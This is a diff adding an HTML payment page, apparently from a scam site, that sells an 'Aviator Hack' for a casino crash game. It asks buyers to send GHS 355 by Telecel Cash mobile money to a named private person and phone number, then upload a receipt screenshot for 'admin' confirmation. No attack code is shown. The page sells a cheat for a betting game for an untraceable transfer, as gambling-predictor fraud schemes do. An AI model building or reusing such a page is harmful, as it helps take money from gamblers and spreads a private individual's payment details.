@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="Pay GHS 355 for Casino World by Mobile Money.">
+        <title>MoMo Payment - Casino World</title>
+        <link rel="stylesheet" href="style.css">
+    </head>
+    <body>
+        <div class="login-container momo-card">
+            <div class="momo-top">
+                <span>MOBILE MONEY</span>
+                <a href="plist.html" aria-label="Close">✕</a>
+            </div>
+            <h1>Pay by MoMo transfer</h1>
+            <p>Aviator Hack</p>
+            <div class="amount">GHS 355</div>
+            <div class="momo-box">
+                <div class="momo-row">
+                    <span class="label">NETWORK</span>
+                    <span class="value">Telecel Cash (Vodafone)</span>
+                </div>
+                <div class="momo-row">
+                    <span class="label">SEND TO</span>
+                    <span class="value">
+                        <span id="momo-number">0502352531</span>
+                        <button type="button" class="copy" id="copy-number">COPY</button>
+                    </span>
+                </div>
+                <div class="momo-row">
+                    <span class="label">NAME</span>
+                    <span class="value">PATRICK AGBAVITOR</span>
+                </div>
+                <div class="momo-row">
+                    <span class="label">AMOUNT</span>
+                    <span class="value green">GHS 355</span>
+                </div>
+            </div>
+            <div class="steps">
+                <p>1. Send <span class="green">GHS 355</span> to the Telecel Cash (Vodafone) details above.</p>
+                <p>2. Attach a screenshot of the payment receipt.</p>
+                <p>3. An admin confirms it under Transactions. This page updates when they do.</p>
+            </div>
+            <form class="upload" id="payment-form" action="plist.html">
+                <label class="receipt" id="receipt-zone" for="receipt">
+                    <span class="receipt-kicker">RECEIPT SCREENSHOT</span>
+                    <span class="receipt-title" id="receipt-title">Choose a screenshot</span>
+                    <span class="receipt-hint">PNG or JPG of your MoMo receipt</span>
+                    <input type="file" id="receipt" name="receipt" accept="image/*" required>
+                </label>
+                <button type="submit">Submit payment</button>
+            </form>
+        </div>
+        <script src="java.s"></script>
+    </body>
+</html>
